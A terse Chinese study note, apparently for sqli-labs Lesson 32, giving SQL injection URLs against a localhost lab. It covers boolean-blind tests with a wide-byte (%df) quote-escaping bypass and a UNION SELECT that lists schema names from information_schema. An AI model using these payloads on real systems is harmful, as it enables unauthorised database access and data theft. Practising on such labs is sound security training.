# Lesson-32
```
Bool盲注-,-明注-,-宽字节绕过
```

宽字节注入 :
``` 
http://127.0.0.1/Less-32/?id=0%df\%27||1--+
http://127.0.0.1/Less-32/?id=0%df\%27||0--+
```
```
http://127.0.0.1/Less-32/?id=0%df%27union%20select%201,group_concat(schema_name),1%20from%20information_schema.schemata--+
```
